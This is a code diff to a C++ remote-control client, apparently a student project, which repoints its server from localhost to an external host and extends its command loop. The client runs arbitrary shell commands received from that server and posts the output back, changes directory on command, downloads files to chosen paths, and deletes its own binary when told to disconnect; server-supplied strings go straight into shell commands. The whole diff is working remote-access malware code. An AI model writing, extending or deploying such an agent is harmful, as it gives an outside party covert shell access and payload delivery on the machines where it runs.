@@ -11,13 +11,14 @@
 using namespace std; 
 using namespace rapidjson;
 
-//const string HOST_URL = "http://cs4001.root.sx:3000/";
-const string HOST_URL = "http://localhost:3000/";
+const string HOST_URL = "http://cs4001.root.sx:3000/";
 
-string exec(string cmd) {
+string exec(string cmd, string working_dir=".") {
     array<char, 128> buffer;
     string output;
-    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    cout << cmd << endl;
+    unique_ptr<FILE, decltype(&pclose)> pipe(
+            popen(("cd " + working_dir + "; " + cmd).c_str(), "r"), pclose);
 
     if (!pipe) {
         throw runtime_error("popen() failed!");
@@ -192,7 +193,7 @@ int main(int argc, char* argv[]) {
 
     int delay = 3;
 
-    string working_dir = ".";
+    string working_dir = exec("pwd");
     if (argc == 2) {
         working_dir = string(argv[1]);
     }
@@ -227,8 +228,13 @@ int main(int argc, char* argv[]) {
 
             if (type == "cmd") {
                 string cmd = document["data"].GetString();
-                string output = exec(cmd);
+                string output = exec(cmd, working_dir);
                 post(HOST_URL + "output", "id=" + id + "&output=" + output);
+            } else if (type == "pwd") {
+                post(HOST_URL + "output", "id=" + id + "&output=" + working_dir);
+            } else if (type == "cd") {
+                string dir = document["data"].GetString();
+                working_dir = exec("cd " + dir + " && pwd", working_dir);
             } else if (type == "kill") {
                 post(HOST_URL + "disconnect", "id=" + id);
                 exec("rm " + string(argv[0]));
@@ -243,11 +249,16 @@ int main(int argc, char* argv[]) {
             } else if (type == "download") {
                 string url = document["data"]["url"].GetString();
                 string location = document["data"]["location"].GetString();
+                string filename = url.substr(url.find_last_of('/')+1);
 
-                if (location.empty()) {
-                    string filename = url.substr(url.find_last_of('/')+1);
+                if (location.empty()) { // default to cwd
                     location = working_dir + "/" + filename;
+                } else if (location.at(0) != '/') { // relative path
+                    location = working_dir + "/" + location + "/" + filename;
+                } else { // absolute path
+                    location += "/" + filename;
                 }
+                post(HOST_URL + "output", "id=" + id + "&output=" + location);
 
                 download_file(url, location);
             }
